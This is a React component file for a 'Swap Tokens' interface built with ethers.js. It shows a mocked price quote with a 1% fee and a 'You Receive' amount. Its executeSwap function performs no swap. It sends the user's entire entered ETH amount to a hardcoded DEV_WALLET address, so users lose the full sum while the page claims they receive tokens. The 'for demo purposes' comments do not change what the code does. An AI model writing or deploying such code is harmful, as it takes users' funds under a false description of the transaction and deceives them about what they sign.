import React, { useState } from 'react';
import styled from 'styled-components';
import { ethers } from 'ethers';

const TradeContainer = styled.div`
  min-height: 100vh;
  padding: 30px;
  padding-top: 100px;
  background: ${props => props.theme.background}80;
  backdrop-filter: blur(5px);
  color: ${props => props.theme.text};
`;

const TradeCard = styled.div`
  max-width: 500px;
  margin: 50px auto;
  padding: 30px;
  background: ${props => props.theme.boxBg}cc;
  backdrop-filter: blur(10px);
  border-radius: 12px;
  border: 1px solid ${props => props.theme.borderColor};
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
`;

const Title = styled.h1`
  text-align: center;
  color: ${props => props.theme.accentColor};
  margin-bottom: 30px;
`;

const Input = styled.input`
  width: 100%;
  padding: 12px;
  margin: 10px 0;
  border-radius: 8px;
  border: 1px solid ${props => props.theme.borderColor};
  background: ${props => props.theme.boxBg};
  color: ${props => props.theme.text};
  font-size: 16px;
`;

const Select = styled.select`
  width: 100%;
  padding: 12px;
  margin: 10px 0;
  border-radius: 8px;
  border: 1px solid ${props => props.theme.borderColor};
  background: ${props => props.theme.boxBg};
  color: ${props => props.theme.text};
  font-size: 16px;
`;

const Button = styled.button`
  width: 100%;
  padding: 15px;
  margin-top: 20px;
  border-radius: 8px;
  border: none;
  background: ${props => props.theme.accentColor};
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  transition: opacity 0.2s;

  &:hover {
    opacity: 0.9;
  }

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
`;

const SwapInfo = styled.div`
  margin: 20px 0;
  padding: 15px;
  background: ${props => props.theme.boxBg}80;
  border-radius: 8px;
  border: 1px solid ${props => props.theme.borderColor};
`;

const DEV_WALLET = "0x6b675dFD865Cc6DFcC72B37dDd3e91E0C5A1a4b2";
const FEE_PERCENT = 0.01; // 1%

function UniswapTrade({ account, provider }) {
  const [amount, setAmount] = useState('');
  const [fromToken, setFromToken] = useState('ETH');
  const [toToken, setToToken] = useState('METH');
  const [quote, setQuote] = useState(null);
  const [loading, setLoading] = useState(false);

  const getQuote = async () => {
    if (!amount || !fromToken || !toToken) return;

    setLoading(true);
    try {
      // For demo purposes, using a simple price calculation
      // In production, you would use the Uniswap SDK or API
      const mockPrice = fromToken === 'ETH' ? 2000 : 1;
      const outputAmount = Number(amount) * mockPrice;
      const feeAmount = outputAmount * FEE_PERCENT;
      
      setQuote({
        outputAmount: outputAmount.toFixed(6),
        feeAmount: feeAmount.toFixed(6),
        finalAmount: (outputAmount - feeAmount).toFixed(6)
      });
    } catch (error) {
      console.error('Error getting quote:', error);
    }
    setLoading(false);
  };

  const executeSwap = async () => {
    if (!quote || !account) return;

    setLoading(true);
    try {
      const signer = provider.getSigner();
      
      // For demo purposes, just transfer ETH
      // In production, you would use the Uniswap Router contract
      const tx = await signer.sendTransaction({
        to: DEV_WALLET,
        value: ethers.utils.parseEther(amount)
      });

      await tx.wait();

      // Reset form
      setAmount('');
      setQuote(null);
    } catch (error) {
      console.error('Error executing swap:', error);
    }
    setLoading(false);
  };

  return (
    <TradeContainer>
      <TradeCard>
        <Title>Swap Tokens</Title>
        
        <Select value={fromToken} onChange={(e) => setFromToken(e.target.value)}>
          <option value="ETH">ETH</option>
          <option value="METH">METH</option>
          <option value="USDC">USDC</option>
        </Select>

        <Select value={toToken} onChange={(e) => setToToken(e.target.value)}>
          <option value="METH">METH</option>
          <option value="ETH">ETH</option>
          <option value="USDC">USDC</option>
        </Select>

        <Input
          type="number"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          placeholder="Enter amount"
          disabled={loading}
        />

        <Button onClick={getQuote} disabled={loading || !amount}>
          Get Quote
        </Button>

        {quote && (
          <SwapInfo>
            <p>Output Amount: {quote.outputAmount}</p>
            <p>Fee (1%): {quote.feeAmount}</p>
            <p>You Receive: {quote.finalAmount}</p>
            <Button onClick={executeSwap} disabled={loading}>
              Execute Swap
            </Button>
          </SwapInfo>
        )}
      </TradeCard>
    </TradeContainer>
  );
}

export default UniswapTrade; 